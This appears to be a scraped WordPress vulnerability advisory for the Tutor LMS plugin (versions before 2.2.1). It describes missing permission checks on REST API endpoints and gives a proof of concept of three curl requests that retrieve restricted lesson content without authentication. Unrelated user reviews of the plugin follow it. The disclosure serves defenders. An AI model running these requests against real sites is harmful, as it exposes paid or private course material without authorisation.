## WordPress Plugin Vulnerabilities

# Tutor LMS < 2.2.1 - Unauthenticated Access to Tutor LMS Lesson Resources via REST API

### Description

The plugin does not implement adequate permission checks for REST API endpoints, allowing unauthenticated attackers to access information from Lessons that should not be publicly available.

### Proof of Concept

1. Create a new Course, add a Topic, and add a Lesson to the Topic.
2. In Tutor LMS > Settings > Course, ensure that "Course Visibility" is toggled to "On" (Students must be logged in to view course)
3. Run the following curl command to get the ID of the course:
curl http://SITE\_URL/wp-json/tutor/v1/courses
4. Using the Course ID, run the following curl command to get the ID of the Topic:
curl http://SITE\_URL/wp-json/tutor/v1/course-topic/<course-id>
5. Using the Topic ID, run the following curl command to get all of the data from the Lesson, without being logged in:
curl http://SITE\_URL/wp-json/tutor/v1/lesson/<topic-id>

Tutor LMS was once a cornerstone of efficiency and reliability, but the release of version 3.0 till 3.1.0 has been deeply disappointing. The update is riddled with critical bugs, severely disrupting its functionality and causing significant challenges.With the new update even no course can be added nor the old ones can be edited.What’s more disheartening is the lack of responsiveness from the support team despite repeated attempts to seek assistance.😞Urgent action is required to resolve these issues or revert to a stable version, as the current state is untenable for professional use.

Great plugin, great tech support. It doesn’t matter what kind of issue your website is dealing with, Tutor LMS staff always find the best solution for you in no time! I got the chance to work with developers “Nafiz & Parag” and they were so HELPFUL. To me, they are over-skilled to resolve any issue on your website.

This is a very very basic LMS and does a good job. But promoting itself as advanced LMS is really not justified. It is just a course builder, good for building documents and free courses.

After sales support is crucial in any purchase and Tutor Team always delivers. They have an amazing team. I can understand some users pointing out bugs–which also happens even to Apple among others! What separates Tutor from others is their patience in resolving issues as long as you are able to describe it to them.
I am. Thankful 🙂 5 star!

In my opinion one of the very best LMS plugins out there, for anyone seriously looking to create an LMS website. I have had great assistance and support from their team, it would be great to be able to have 24/7 support or even be able to speak to someone on the line but I really can’t complain. I was initially disappointed when they removed the lifetime plan option, but I am glad they brought it back and I plan to invest in it at some point soon; I have used their services for a year now and it has been top-notch, upwards and onwards!

That’s a great initiative to upgrade Tutor from time to time, but IS NOT SO GREAT when you change the flow, the user interface, and especially the new upgrade BROKE down things that previously worked fine. There is a rule: don’t touch things that work well! Now we have to do a lot of work with testing the new flow, new courses, new things… and I hate that! If I bought one thing, let that thing as I bought it, don’t change anything because I bought it because I need it as it initially was! Hope this makes sense to you.
